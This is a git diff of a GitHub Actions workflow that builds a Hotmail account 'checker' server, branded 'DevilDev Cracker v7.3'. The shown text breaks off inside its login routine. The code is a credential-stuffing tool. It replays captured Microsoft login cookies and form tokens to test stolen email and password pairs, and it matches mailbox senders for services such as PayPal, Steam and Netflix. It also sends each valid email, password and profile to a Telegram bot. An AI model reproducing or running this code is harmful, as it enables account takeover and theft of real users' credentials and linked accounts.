@@ -1,4 +1,4 @@
-name: Hotmail 6H Max Checker
+name: DevilDev Hotmail 6H
 
 on:
   workflow_dispatch:
@@ -15,7 +15,7 @@ jobs:
         run: |
           pip install flask requests > /dev/null 2>&1
           cat > server.py << 'PYEOF'
-          import os, threading, requests, urllib.parse, re, sys, time, random, uuid, json
+          import os, threading, requests, urllib.parse, re, sys, time, random
           from flask import Flask, request, redirect, url_for, render_template_string, send_file
           from queue import Queue
           from pathlib import Path
@@ -26,439 +26,386 @@ jobs:
           app.config['MAX_CONTENT_LENGTH'] = 16 * 1024 * 1024
           os.makedirs(app.config['UPLOAD_FOLDER'], exist_ok=True)
 
-          bababutelegraminannasinisiker = {
-              'Facebook': {'sender': 'security@facebookmail.com'},
-              'Instagram': {'sender': 'security@mail.instagram.com'},
-              'TikTok': {'sender': 'register@account.tiktok.com'},
-              'Twitter': {'sender': 'info@x.com'},
-              'LinkedIn': {'sender': 'security-noreply@linkedin.com'},
-              'Netflix': {'sender': 'info@account.netflix.com'},
-              'Spotify': {'sender': 'no-reply@spotify.com'},
-              'Disney+': {'sender': 'no-reply@disneyplus.com'},
-              'Amazon': {'sender': 'auto-confirm@amazon.com'},
-              'Trendyol': {'sender': 'noreply@trendyol.com'},
-              'Hepsiburada': {'sender': 'noreply@hepsiburada.com'},
-              'N11': {'sender': 'noreply@n11.com'},
-              'Yemeksepeti': {'sender': 'noreply@yemeksepeti.com'},
-              'Getir': {'sender': 'noreply@getir.com'},
-              'Migros': {'sender': 'noreply@migros.com.tr'},
-              'LCWaikiki': {'sender': 'noreply@lcwaikiki.com'},
-              'Defacto': {'sender': 'noreply@defacto.com.tr'},
-              'Papara': {'sender': 'noreply@papara.com'},
-              'Snapchat': {'sender': 'team@snapchat.com'},
-              'PayPal': {'sender': 'service@paypal.com'},
-              'YouTube': {'sender': 'no-reply@youtube.com'},
-              'Duolingo': {'sender': 'no-reply@duolingo.com'},
-              'Discord': {'sender': 'noreply@discord.com'},
-              'Pinterest': {'sender': 'noreply@account.pinterest.com'},
-              'Apple': {'sender': 'noreply@apple.com'},
-              'Steam': {'sender': 'noreply@steampowered.com'},
-              'Xbox': {'sender': 'xboxreps@engage.xbox.com'},
-              'PlayStation': {'sender': 'reply@txn-email.playstation.com'},
-              'EpicGames': {'sender': 'help@acct.epicgames.com'},
-              'Rockstar': {'sender': 'noreply@rockstargames.com'},
-              'RiotGames': {'sender': 'no-reply@riotgames.com'},
-              'PUBG': {'sender': 'PUBG Mobile'},
-              'Roblox': {'sender': 'accounts@roblox.com'},
-              'Supercell': {'sender': 'noreply@id.supercell.com'},
-              'Google': {'sender': 'no-reply@accounts.google.com'},
-              'Microsoft': {'sender': 'account-security-noreply@accountprotection.microsoft.com'},
+          SENDERS = {
+              'Facebook': {'sender': 'security@facebookmail.com'}, 'Instagram': {'sender': 'security@mail.instagram.com'},
+              'TikTok': {'sender': 'register@account.tiktok.com'}, 'Twitter': {'sender': 'info@x.com'},
+              'LinkedIn': {'sender': 'security-noreply@linkedin.com'}, 'Netflix': {'sender': 'info@account.netflix.com'},
+              'Spotify': {'sender': 'no-reply@spotify.com'}, 'Disney+': {'sender': 'no-reply@disneyplus.com'},
+              'Amazon': {'sender': 'auto-confirm@amazon.com'}, 'Trendyol': {'sender': 'noreply@trendyol.com'},
+              'Hepsiburada': {'sender': 'noreply@hepsiburada.com'}, 'N11': {'sender': 'noreply@n11.com'},
+              'Yemeksepeti': {'sender': 'noreply@yemeksepeti.com'}, 'Getir': {'sender': 'noreply@getir.com'},
+              'Migros': {'sender': 'noreply@migros.com.tr'}, 'LCWaikiki': {'sender': 'noreply@lcwaikiki.com'},
+              'Defacto': {'sender': 'noreply@defacto.com.tr'}, 'Papara': {'sender': 'noreply@papara.com'},
+              'Snapchat': {'sender': 'team@snapchat.com'}, 'PayPal': {'sender': 'service@paypal.com'},
+              'YouTube': {'sender': 'no-reply@youtube.com'}, 'Duolingo': {'sender': 'no-reply@duolingo.com'},
+              'Discord': {'sender': 'noreply@discord.com'}, 'Pinterest': {'sender': 'noreply@account.pinterest.com'},
+              'Apple': {'sender': 'noreply@apple.com'}, 'Steam': {'sender': 'noreply@steampowered.com'},
+              'Xbox': {'sender': 'xboxreps@engage.xbox.com'}, 'PlayStation': {'sender': 'reply@txn-email.playstation.com'},
+              'EpicGames': {'sender': 'help@acct.epicgames.com'}, 'Rockstar': {'sender': 'noreply@rockstargames.com'},
+              'RiotGames': {'sender': 'no-reply@riotgames.com'}, 'PUBG': {'sender': 'PUBG Mobile'},
+              'Roblox': {'sender': 'accounts@roblox.com'}, 'Supercell': {'sender': 'noreply@id.supercell.com'},
+              'Google': {'sender': 'no-reply@accounts.google.com'}, 'Microsoft': {'sender': 'account-security-noreply@accountprotection.microsoft.com'},
           }
 
-          class umidiemcan:
+          class TelegramNotifier:
               def __init__(self, token, chat_id):
-                  self.token = token
-                  self.chat_id = chat_id
-                  self.temelburasi = f'https://api.telegram.org/bot{token}'
-              def bababiziz(self, email, password, captures, results):
+                  self.token, self.chat_id = token, chat_id
+                  self.api_url = f"https://api.telegram.org/bot{token}"
+              def send_hit(self, email, password, captures, matches):
                   try:
-                      dursunburasi = '\n'.join(f'• {k}: {v}' for k, v in captures.items())
-                      fadimeoc = '\n'.join(f'✅ {svc} ({data["total"]} mesaj) — {data["last_msg"][:50]}' for svc, data in results.items())
-                      kombinzaradan = f'🔱 <b>HIT BULUNDU</b>\n\n🔱 <b>Email:</b> <code>{email}</code>\n🔱 <b>Şifre:</b> <code>{password}</code>\n\n🔱 <b>Profil:</b>\n{dursunburasi}\n\n🔱 <b>Servisler:</b>\n{fadimeoc}\n\n⚊⚊⚊⚊⚊⚊⚊⚋⚊⚊⚋⚊⚊⚋⚊\n<b>PROGRAM :</b> @octopusmarjinal'
-                      requests.post(f'{self.temelburasi}/sendMessage', json={'chat_id': self.chat_id, 'text': kombinzaradan, 'parse_mode': 'HTML', 'disable_web_page_preview': True}, timeout=15)
+                      profil = "\n".join(f"• {k}: {v}" for k, v in captures.items())
+                      bulunan = "\n".join(f"✅ {kw}: {data['total']} mesaj — {data['last_msg'][:50]}" for kw, data in matches.items())
+                      mesaj = f"🔱 <b>HIT BULUNDU (DevilDev v7.3)</b>\n\n📧 <b>Email:</b> <code>{email}</code>\n🔑 <b>Şifre:</b> <code>{password}</code>\n\n👤 <b>Profil:</b>\n{profil}\n\n🔎 <b>Eşleşen Servisler:</b>\n{bulunan}\n\n⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊\n<b>🛡️ DevilDev Cracker v7.3</b>"
+                      requests.post(f"{self.api_url}/sendMessage", json={"chat_id": self.chat_id, "text": mesaj, "parse_mode": "HTML", "disable_web_page_preview": True}, timeout=15)
                   except Exception: pass
 
           class LoginError(Exception): pass
 
-          class wearthelegend:
-              def __init__(self, email, password):
-                  self.email = email
-                  self.password = password
+          class HotmailChecker:
+              def __init__(self, email, password, keywords=None):
+                  self.email, self.password = email, password
+                  self.keywords = keywords if keywords else []
                   self.session = requests.Session()
-                  self.ua = 'Mozilla/5.0 (Linux; Android 12; SM-G988N Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/95.0.4638.74 Mobile Safari/537.36 PKeyAuth/1.0'
-                  self.session.headers.update({'User-Agent': self.ua, 'Accept-Language': 'en-US,en;q=0.9'})
-                  self.code = None
-                  self.pornotoken = None
-                  self.ponotoken = None
-                  self.poynotoken = None
-                  self.cid = None
-                  self.babazingozingo = {}
-                  self.coid = '3d0f0eea-617a-4b9c-a747-100934dca583'
-                  self.results = {}
+                  self.ua = "Mozilla/5.0 (Linux; Android 12; SM-G988N Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/95.0.4638.74 Mobile Safari/537.36 PKeyAuth/1.0"
+                  self.session.headers.update({"User-Agent": self.ua, "Accept-Language": "en-US,en;q=0.9"})
+                  self.code = self.refresh_token = self.access_token = self.substrate_token = self.cid = None
+                  self.captures, self.coid = {}, "3d0f0eea-617a-4b9c-a747-100934dca583"
+
               @staticmethod
-              def beniyuregineyaz(text): return urllib.parse.quote(text, safe='')
-              def artikhemsireyim(self): return '; '.join(f'{c.name}={c.value}' for c in self.session.cookies)
-              def kodyazmayibirakacam(self, text):
-                  match = re.search(r'[?&]code=([^&#\s"\']+)', text)
+              def url_encode(text): return urllib.parse.quote(text, safe="")
+              def get_cookie_string(self): return "; ".join(f"{c.name}={c.value}" for c in self.session.cookies)
+              def extract_code(self, text):
+                  match = re.search(r"[?&]code=([^&#\s\"']+)", text)
                   if match: return urllib.parse.unquote(match.group(1))
                   match = re.search(r'"code"\s*:\s*"([^"]+)"', text)
-                  if match: return match.group(1)
-                  return None
+                  return match.group(1) if match else None
+
               def login(self):
-                  us = self.beniyuregineyaz(self.email)
-                  ps = self.beniyuregineyaz(self.password)
-                  yanibabacum = 'https://login.live.com/ppsecure/post.srf?client_id=0000000048170EF2&contextid=E5D8A9B73286B7E0&opid=EED8E3DBCC1AAA6A&bk=1726223182&uaid=3d0f0eea617a4b9c-a747100934dca583&pid=15216'
-                  content = 'ps=2&psRNGCDefaultType=1&psRNGCEntropy=&psRNGCSLK=-DmudFdPtArk2f9r5G2PufUpIRX8Q9eTm0uFuxS%21hSx27M79PeFyCVNx8l*VUvBBCZwJL62A9FEyKuXoxgKbI96TjlB*EvImvYFtSQP1wJLfwKYWtRUwse4dkf5WNXBy4f3cLPgvJUS1dNFFN4dQAhcmYSlgRfH5J8LYwg3IxmSUcIY%212SkUUWsssgF35aoj%21gcQGM0O0sAJysZGUcmHQJbJ0hIbBG3yJhkeQLukMukTf&canary=&ctx=rQQIARAA4-Iz1DPUM9BOTLFItDAwMhViNNRiNtIzsBIwgAITC0NzA1c3oyIhLoFXfPy2VYlzvJe7C3Ca3FnavIOR8QIj4yQmsbzElKr48tSkpHyHjPyS3MTMHL3k_NwLTIy3mPj9HUtLMoxARH5RZlXqJmbO5Py84tLc1KLiU8xO-WlpOZl5qfGJycmpxcUK-QWpeZkpCgVF-WmZOakKxalFZZnJqVZW-aUlOfn52XpA5UA-yHArK18nz_jgYJ8bzIwXWBhfsfBwMAowSjAoMGhoGDD-YGFcxAp08bEnm6pv3i5y6C5O7eyxLGE4xapfHl7qZOJr4WdalZhT4Z8f4pkbkudV5ZzqZeyd6mfkGOpvlOyWnFgVEOrna2tqZfiDlXECGxAJn2IT8g129NGrKMhJLNFLzEspys9M-cDG0MHOsItTK6OkpKDYSl8_Jz89M08vJ7MM7Ej9_ESQ5w3iU1KLs0vyC_SKi9JmcDHe4uHj4sxILE7OKMrPTQWG-QFehh98a482T33xe8s7jw0CDA8EGCYJsnMxA-NGgBEA0&hpgrequestid=&PPFT=-Dthk7KM0CcBognHLIww755uCZB5%21Bu7m0e12TJTvKQxteHh9t6VfghqUlt7cYV4*a%21RMEJTP9hmig2BsgHRUrv2uDOS9ATAi4O%21tGitoYrHZifX5YWtvttGdTH3624e8BFApW%21PxPogDIIFO8P5N5D9IdEtmsTG87fjOlbYry3wl20FV7nt4YM7mlRZDnd*c7HjVpbIE%21eAr0HCbiX9SUJYKmdpvfqCC%21y6GNCug%211cRYmi%21k%21Tp4blIALTbVOAh9A%24%24&PPSX=Pas&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=0&isSignupPost=0&isRecoveryAttemptPost=0&i13=1' + f'&login={us}&loginfmt={us}&type=11&LoginOptions=1&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd={ps}'
-                  headers = {'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'Accept-Encoding': 'gzip, deflate', 'Accept-Language': 'en-US,en;q=0.9', 'Cache-Control': 'max-age=0', 'Connection': 'keep-alive', 'Content-Type': 'application/x-www-form-urlencoded', 'Host': 'login.live.com', 'Origin': 'https://login.live.com', 'Referer': 'https://login.live.com/oauth20_authorize.srf?client_id=0000000048170EF2&scope=offline_access+openid+profile+service%3a%3aoutlook.office.com%3a%3aMBI_SSL&redirect_uri=https%3a%2f%2flogin.live.com%2foauth20_desktop.srf&response_type=code&login_hint=nadz_webbo%40hotmail.com&x-client-SKU=MSAL.xplat.android&x-client-Ver=1.1.0%2bad8a8025&uaid=3d0f0eea617a4b9ca747100934dca583&msproxy=1&issuer=mso&tenant=consumers&ui_locales=en-US&client_info=1&epct=PAQABDgEAAAApTwJmzXqdR4BN2miheQMYtnkwRi0KYRBFtiOdZWedDcJo1x9nkE77oPupHA89D0sKWIqlJtDjwdE8G83lJBW6B5l1WNYBlZ3nk7XTxORpBxSFUJMD0i62-IiTlh6Eo_n5qerCKhTsdwoLQxSRvgLKdJcTjAEJ-Irl78Q8tBQcLDArONnm7z72MYf4HOzF5Ad9Cm-MIpCwrG_jOBp9IKcq7eZtWTLGBIk9UtPCtt6t6SAA&jshs=0&haschrome=1&passKeyAuth=1.0%2fpasskey&ctx=rQQIARAA4-Iz1DPUM9BOTLFItDAwMhViNNRiNtIzsBIwgAITC0NzA1c3oyIhLoFXfPy2VYlzvJe7C3Ca3FnavIOR8QIj4yQmsbzElKr48tSkpHyHjPyS3MTMHL3k_NwLTIy3mPj9HUtLMoxARH5RZlXqJmbO5Py84tLc1KLiU8xO-WlpOZl5qfGJycmpxcUK-QWpeZkpCgVF-WmZOakKxalFZZnJqVZW-aUlOfn52XpA5UA-yHArK18nz_jgYJ8bzIwXWBhfsfBwMAowSjAoMGhoGDD-YGFcxAp08bEnm6pv3i5y6C5O7eyxLGE4xapfHl7qZOJr4WdalZhT4Z8f4pkbkudV5ZzqZeyd6mfkGOpvlOyWnFgVEOrna2tqZfiDlXECGxAJn2IT8g129NGrKMhJLNFLzEspys9M-cDG0MHOsItTK6OkpKDYSl8_Jz89M08vJ7MM7Ej9_ESQ5w3iU1KLs0vyC_SKi9JmcDHe4uHj4sxILE7OKMrPTQWG-QFehh98a482T33xe8s7jw0CDA8EGCYJsnMxA-NGgBEA0', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1', 'Upgrade-Insecure-Requests': '1', 'X-Requested-With': 'com.microsoft.office.outlook'}
-                  self.session.cookies.set('MSPRequ', 'id=N&lt=1726223182&co=1', domain='login.live.com')
-                  self.session.cookies.set('uaid', '3d0f0eea617a4b9c-a747100934dca583', domain='login.live.com')
-                  self.session.cookies.set('RefreshTokenSso', 'Dgk7lfaShHcQZcgrBYCkHQ6rOBVO9XNFLG0UAhAxkdv3VSeG!mMx2aqqQMTkrp8KSTESlUReGSb3Ga!BIkVRZHv!QEw85VrPUHcQOwkT5gYS2J*TjQeUULzkFbF1HDRsHYZIIfqG741wN3NfHwr6KXo$', domain='login.live.com')
-                  self.session.cookies.set('MSPOK', '$uuid-90478d00-dd39-405a-8731-bd22329637de', domain='login.live.com')
-                  self.session.cookies.set('OParams', '11O.DsdeQF2y3fsl3M9I0rhb6w95IwZaderdmXLRh6pKeUGbd1PqLEw8JTc28KdKuOsGYu!PzrPkEGJhuQmW*uMSRDsAjGDX0QElSnaFWMErTliKbWK5a9BWYp2c!aK8z1lwcscrbAr1548TFJxSZPl!9Eqk08i0mhxSQsfi7uARKID6R49B4664XQmPGN3CUdfFYjYwW4!lCPLt5BN9cFkaimWnB1wTV!klMzGgtIdHbgmRPzb4WqATStbDaOgvt6JQ6ceoWkz7q*lyN7B4URaaaUJyG1A4oUMzS!7EStUP250VY3RPJB!YAQgq0ft9H4FvXQEjx!FkN7WskkkMbJZ*wAZYEGRgEoPyigP*vrE5zjQIfJ4VB5NvsuhAYbCS5bNRPxOFO7b2o5!AC2jNOGSJytHxKQQnCUcTBcvx1PAjAi2kuEPWTiOjJOxXidNu33PX5kNTriDyGCz46KlHu7ZnFS3QryeAf0lgEZyanDBiFpBvFZE1kxFXen20cH4GIavuKM!99iqdMI6vee7AQgrrDerhcvoSLfVnii5K7xW1B1NUZxihRGFhHw8oJGm4TV2Krs5ICuvSJz9asEHNwvDBZR37UPJjrfBqHkoDM8!3nQ**PGfGam1Vv3xXpjaCuNUy4LCvUrrrO3cyBYCdKp0J16JvEATRytd!jfu*OwJpLnwOoQ6oRVyqFAC99Dp9elLxcbE2rZnZ1gUblQcmFY3ZcHtyLC7faZt*4SzJEaFZ1FCYIgSjyEajoc4213d1dz7vdfBJwsihLN!Y8QoIp0gFo!DM6ltWkmowBRD1hxr!!M60DG5jz75KOPdvVDqlnvbVXf0LqEMoRwsruk65gEF3Dy1Z!yNS5V6q5PSFQj5SvyG!EWon7Mbn6KsyTGBP9tOLdmFHVlie7IX8lBlQf2*z2PjGlEhUn!V6OM0*GHDtqyPuoJMtBIhBSFG4etMhl4UJvOcnyzWdw0PNhGBt6DUiTlDGmtKJMgkH4KyhI1bUoJ26pGSF0mAlFpqtiSNcSdcz1C*0HLUMTbtNW!6q9JZSgF3Gu!8TOsaqV60kiA3iQfQg9IrEtTt6RXDhgLsHzzYYpJy51cRGIk4u5hbVFNAyTZFUuSBpMWCPXFMqo6ZRbkpgKgl7c!j2kbrtVtUC83paGru7Af4!rS1qMgz4xP9d1W7yZDJCd38FmQgUzMFmO8wH0ISVq9m4XbGnzJDvlkI6PI0H1XJz008Q9I5VjDRgzlHPZ4beD8UeTbbt!*r0sZh5f39oQEkpUWgbL2VVQQEKzAdO0O6360kXJObygeg7gr8GIOYsjq4w7W9BX52ESfBBy0dmsx3FPiHgnkCI9lrp!4G!H0sEuPW38zcDrMLF1GxsfGRZ5cL6cfNSo75QFqqQ4j372o6Cr5XjBXv*8wnrB5iYlbZkkkGtLkdhPvo8Wy9Lxl!jr80Y1n98mGdTZPId', domain='login.live.com')
-                  self.session.cookies.set('MicrosoftApplicationsTelemetryDeviceId', 'ac497201-f3d3-41a7-883c-c50515eabaca', domain='login.live.com')
-                  self.session.cookies.set('ai_session', 'fiaZX16SGDUFsD1Xch3TeF|1726223182490|1726223182490', domain='login.live.com')
-                  self.session.cookies.set('MUID', '354ca661609b474d9471b6de17e93df7', domain='login.live.com')
-                  self.session.cookies.set('fptctx2', 'taBcrIH61PuCVH7eNCyH0K%252fD9DJ44Cptuv0RyrXgXCtEN7M2YMZXcDGxJBSYuGaBLu%252f9JiKDcHLb%252f8JINIhnqSktvc1WTHmZoNaDBGu0QNkIeXqEXSCok8RtGp9vucSE3bH5AyTgKraZz30bwBlRTs8zdebR61peqnbTMLSFu6Z%252fZI8YhEdhzrq6nSuKh7inDsCtL6VZeyS07TLSEhlzeZHY%252fjvAzMVzeXcFDOYLj9JQT%252fFVpLid%252bKgDYOoV40MX%252f0cn4aUVeWt%252bSo7YLMbJTg5NfzPcPtwlcy%252f8xu9HYDOWFtE6HZ%252b3j%252bSBwN5QxLYZkyNTTaCh7UxRHmNg2bu3qw%253d%253d', domain='login.live.com')
-                  self.session.cookies.set('MSFPC', 'GUID=23978213118146a292284de1afde68a9&HASH=2397&LV=202409&V=4&LU=1726223190403', domain='login.live.com')
+                  us, ps = self.url_encode(self.email), self.url_encode(self.password)
+                  login_url = "https://login.live.com/ppsecure/post.srf?client_id=0000000048170EF2&contextid=E5D8A9B73286B7E0&opid=EED8E3DBCC1AAA6A&bk=1726223182&uaid=3d0f0eea617a4b9c-a747100934dca583&pid=15216"
+                  payload = "ps=2&psRNGCDefaultType=1&psRNGCEntropy=&psRNGCSLK=-DmudFdPtArk2f9r5G2PufUpIRX8Q9eTm0uFuxS%21hSx27M79PeFyCVNx8l*VUvBBCZwJL62A9FEyKuXoxgKbI96TjlB*EvImvYFtSQP1wJLfwKYWtRUwse4dkf5WNXBy4f3cLPgvJUS1dNFFN4dQAhcmYSlgRfH5J8LYwg3IxmSUcIY%212SkUUWsssgF35aoj%21gcQGM0O0sAJysZGUcmHQJbJ0hIbBG3yJhkeQLukMukTf&canary=&ctx=rQQIARAA4-Iz1DPUM9BOTLFItDAwMhViNNRiNtIzsBIwgAITC0NzA1c3oyIhLoFXfPy2VYlzvJe7C3Ca3FnavIOR8QIj4yQmsbzElKr48tSkpHyHjPyS3MTMHL3k_NwLTIy3mPj9HUtLMoxARH5RZlXqJmbO5Py84tLc1KLiU8xO-WlpOZl5qfGJycmpxcUK-QWpeZkpCgVF-WmZOakKxalFZZnJqVZW-aUlOfn52XpA5UA-yHArK18nz_jgYJ8bzIwXWBhfsfBwMAowSjAoMGhoGDD-YGFcxAp08bEnm6pv3i5y6C5O7eyxLGE4xapfHl7qZOJr4WdalZhT4Z8f4pkbkudV5ZzqZeyd6mfkGOpvlOyWnFgVEOrna2tqZfiDlXECGxAJn2IT8g129NGrKMhJLNFLzEspys9M-cDG0MHOsItTK6OkpKDYSl8_Jz89M08vJ7MM7Ej9_ESQ3w3iU1KLs0vyC_SKi9JmcDHe4uHj4sxILE7OKMrPTQWG-QFehh98a482T33xe8s7jw0CDA8EGCYJsnMxA-NGgBEA0&hpgrequestid=&PPFT=-Dthk7KM0CcBognHLIww755uCZB5%21Bu7m0e12TJTvKQxteHh9t6VfghqUlt7cYV4*a%21RMEJTP9hmig2BsgHRUrv2uDOS9ATAi4O%21tGitoYrHZifX5YWtvttGdTH3624e8BFApW%21PxPogDIIFO8P5N5D9IdEtmsTG87fjOlbYry3wl20FV7nt4YM7mlRZDnd*c7HjVpbIE%21eAr0HCbiX9SUJYKmdpvfqCC%21y6GNCug%211cRYmi%21k%21Tp4blIALTbVOAh9A%24%24&PPSX=Pas&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=0&isSignupPost=0&isRecoveryAttemptPost=0&i13=1" + f"&login={us}&loginfmt={us}&type=11&LoginOptions=1&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd={ps}"
+                  headers = {"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9", "Cache-Control": "max-age=0", "Connection": "keep-alive", "Content-Type": "application/x-www-form-urlencoded", "Host": "login.live.com", "Origin": "https://login.live.com", "Referer": "https://login.live.com/oauth20_authorize.srf?client_id=0000000048170EF2&scope=offline_access+openid+profile+service%3a%3aoutlook.office.com%3a%3aMBI_SSL&redirect_uri=https%3a%2f%2flogin.live.com%2foauth20_desktop.srf&response_type=code&login_hint=nadz_webbo%40hotmail.com&x-client-SKU=MSAL.xplat.android&x-client-Ver=1.1.0%2bad8a8025&uaid=3d0f0eea617a4b9ca747100934dca583&msproxy=1&issuer=mso&tenant=consumers&ui_locales=en-US&client_info=1&epct=PAQABDgEAAAApTwJmzXqdR4BN2miheQMYtnkwRi0KYRBFtiOdZWedDcJo1x9nkE77oPupHA89D0sKWIqlJtDjwdE8G83lJBW6B5l1WNYBlZ3nk7XTxORpBxSFUJMD0i62-IiTlh6Eo_n5qerCKhTsdwoLQxSRvgLKdJcTjAEJ-Irl78Q8tBQcLDArONnm7z72MYf4HOzF5Ad9Cm-MIpCwrG_jOBp9IKcq7eZtWTLGBIk9UtPCtt6t6SAA&jshs=0&haschrome=1&passKeyAuth=1.0%2fpasskey&ctx=rQQIARAA4-Iz1DPUM9BOTLFItDAwMhViNNRiNtIzsBIwgAITC0NzA1c3oyIhLoFXfPy2VYlzvJe7C3Ca3FnavIOR8QIj4yQmsbzElKr48tSkpHyHjPyS3MTMHL3k_NwLTIy3mPj9HUtLMoxARH5RZlXqJmbO5Py84tLc1KLiU8xO-WlpOZl5qfGJycmpxcUK-QWpeZkpCgVF-WmZOakKxalFZZnJqVZW-aUlOfn52XpA5UA-yHArK18nz_jgYJ8bzIwXWBhfsfBwMAowSjAoMGhoGDD-YGFcxAp08bEnm6pv3i5y6C5O7eyxLGE4xapfHl7qZOJr4WdalZhT4Z8f4pkbkudV5ZzqZeyd6mfkGOpvlOyWnFgVEOrna2tqZfiDlXECGxAJn2IT8g129NGrKMhJLNFLzEspys9M-cDG0MHOsItTK6OkpKDYSl8_Jz89M08vJ7MM7Ej9_ESQ3w3iU1KLs0vyC_SKi9JmcDHe4uHj4sxILE7OKMrPTQWG-QFehh98a482T33xe8s7jw0CDA8EGCYJsnMxA-NGgBEA0", "Sec-Fetch-Dest": "document", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-User": "?1", "Upgrade-Insecure-Requests": "1", "X-Requested-With": "com.microsoft.office.outlook"}
+                  self.session.cookies.set("MSPRequ", "id=N&lt=1726223182&co=1", domain="login.live.com")
+                  self.session.cookies.set("uaid", "3d0f0eea617a4b9c-a747100934dca583", domain="login.live.com")
+                  self.session.cookies.set("RefreshTokenSso", "Dgk7lfaShHcQZcgrBYCkHQ6rOBVO9XNFLG0UAhAxkdv3VSeG!mMx2aqqQMTkrp8KSTESlUReGSb3Ga!BIkVRZHv!QEw85VrPUHcQOwkT5gYS2J*TjQeUULzkFbF1HDRsHYZIIfqG741wN3NfHwr6KXo$", domain="login.live.com")
+                  self.session.cookies.set("MSPOK", "$uuid-90478d00-dd39-405a-8731-bd22329637de", domain="login.live.com")
+                  self.session.cookies.set("OParams", "11O.DsdeQF2y3fsl3M9I0rhb6w95IwZaderdmXLRh6pKeUGbd1PqLEw8JTc28KdKuOsGYu!PzrPkEGJhuQmW*uMSRDsAjGDX0QElSnaFWMErTliKbWK5a9BWYp2c!aK8z1lwcscrbAr1548TFJxSZPl!9Eqk08i0mhxSQsfi7uARKID6R49B4664XQmPGN3CUdfFYjYwW4!lCPLt5BN9cFkaimWnB1wTV!klMzGgtIdHbgmRPzb4WqATStbDaOgvt6JQ6ceoWkz7q*lyN7B4URaaaUJyG1A4oUMzS!7EStUP250VY3RPJB!YAQgq0ft9H4FvXQEjx!FkN7WskkkMbJZ*wAZYEGRgEoPyigP*vrE5zjQIfJ4VB5NvsuhAYbCS5bNRPxOFO7b2o5!AC2jNOGSJytHxKQQnCUcTBcvx1PAjAi2kuEPWTiOjJOxXidNu33PX5kNTriDyGCz46KlHu7ZnFS3QryeAf0lgEZyanDBiFpBvFZE1kxFXen20cH4GIavuKM!99iqdMI6vee7AQgrrDerhcvoSLfVnii5K7xW1B1NUZxihRGFhHw8oJGm4TV2Krs5ICuvSJz9asEHNwvDBZR37UPJjrfBqHkoDM8!3nQ**PGfGam1Vv3xXpjaCuNUy4LCvUrrrO3cyBYCdKp0J16JvEATRytd!jfu*OwJpLnwOoQ6oRVyqFAC99Dp9elLxcbE2rZnZ1gUblQcmFY3ZcHtyLC7faZt*4SzJEaFZ1FCYIgSjyEajoc4213d1dz7vdfBJwsihLN!Y8QoIp0gFo!DM6ltWkmowBRD1hxr!!M60DG5jz75KOPdvVDqlnvbVXf0LqEMoRwsruk65gEF3Dy1Z!yNS5V6q5PSFQj5SvyG!EWon7Mbn6KsyTGBP9tOLdmFHVlie7IX8lBlQf2*z2PjGlEhUn!V6OM0*GHDtqyPuoJMtBIhBSFG4etMhl4UJvOcnyzWdw0PNhGBt6DUiTlDGmtKJMgkH4KyhI1bUoJ26pGSF0mAlFpqtiSNcSdcz1C*0HLUMTbtNW!6q9JZSgF3Gu!8TOsaqV60kiA3iQfQg9IrEtTt6RXDhgLsHzzYYpJy51cRGIk4u5hbVFNAyTZFUuSBpMWCPXFMqo6ZRbkpgKgl7c!j2kbrtVtUC83paGru7Af4!rS1qMgz4xP9d1W7yZDJCd38FmQgUzMFmO8wH0ISVq9m4XbGnzJDvlkI6PI0H1XJz008Q9I5VjDRgzlHPZ4beD8UeTbbt!*r0sZh5f39oQEkpUWgbL2VVQQEKzAdO0O6360kXJObygeg7gr8GIOYsjq4w7W9BX52ESfBBy0dmsx3FPiHgnkCI9lrp!4G!H0sEuPW38zcDrMLF1GxsfGRZ5cL6cfNSo75QFqqQ4j372o6Cr5XjBXv*8wnrB5iYlbZkkkGtLkdhPvo8Wy9Lxl!jr80Y1n98mGdTZPId", domain="login.live.com")
+                  self.session.cookies.set("MicrosoftApplicationsTelemetryDeviceId", "ac497201-f3d3-41a7-883c-c50515eabaca", domain="login.live.com")
+                  self.session.cookies.set("ai_session", "fiaZX16SGDUFsD1Xch3TeF|1726223182490|1726223182490", domain="login.live.com")
+                  self.session.cookies.set("MUID", "354ca661609b474d9471b6de17e93df7", domain="login.live.com")
+                  self.session.cookies.set("fptctx2", "taBcrIH61PuCVH7eNCyH0K%252fD9DJ44Cptuv0RyrXgXCtEN7M2YMZXcDGxJBSYuGaBLu%252f9JiKDcHLb%252f8JINIhnqSktvc1WTHmZoNaDBGu0QNkIeXqEXSCok8RtGp9vucSE3bH5AyTgKraZz30bwBlRTs8zdebR61peqnbTMLSFu6Z%252fZI8YhEdhzrq6nSuKh7inDsCtL6VZeyS07TLSEhlzeZHY%252fjvAzMVzeXcFDOYLj9JQT%252fFVpLid%252bKgDYOoV40MX%252f0cn4aUVeWt%252bSo7YLMbJTg5NfzPcPtwlcy%252f8xu9HYDOWFtE6HZ%252b3j%252bSBwN5QxLYZkyNTTaCh7UxRHmNg2bu3qw%253d%253d", domain="login.live.com")
+                  self.session.cookies.set("MSFPC", "GUID=23978213118146a292284de1afde68a9&HASH=2397&LV=202409&V=4&LU=1726223190403", domain="login.live.com")
                   time.sleep(random.uniform(0.2, 0.5))
-                  resp = self.session.post(yanibabacum, data=content, headers=headers, allow_redirects=True, timeout=30)
-                  text = resp.text
-                  url = str(resp.url)
-                  cookies = self.artikhemsireyim()
-                  if 'Sign in to your Microsoft account' in text: raise LoginError('BAD')
